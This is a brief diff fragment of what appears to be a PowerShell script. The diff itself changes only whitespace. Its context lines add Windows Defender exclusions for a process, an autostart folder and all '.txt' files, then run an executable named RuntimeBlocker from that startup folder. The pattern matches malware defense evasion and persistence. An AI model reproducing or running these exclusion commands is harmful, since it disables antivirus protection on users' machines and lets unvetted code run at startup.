@@ -12,7 +12,7 @@ $l3 =$autostart + "\" + "log3.txt"
 Add-MpPreference -ExclusionProcess $t1
 Add-MpPreference -ExclusionPath $autostart
 Add-MpPreference -ExclusionExtension “txt”
-
+ 
 cd $autostart
 .\RuntimeBlocker
 
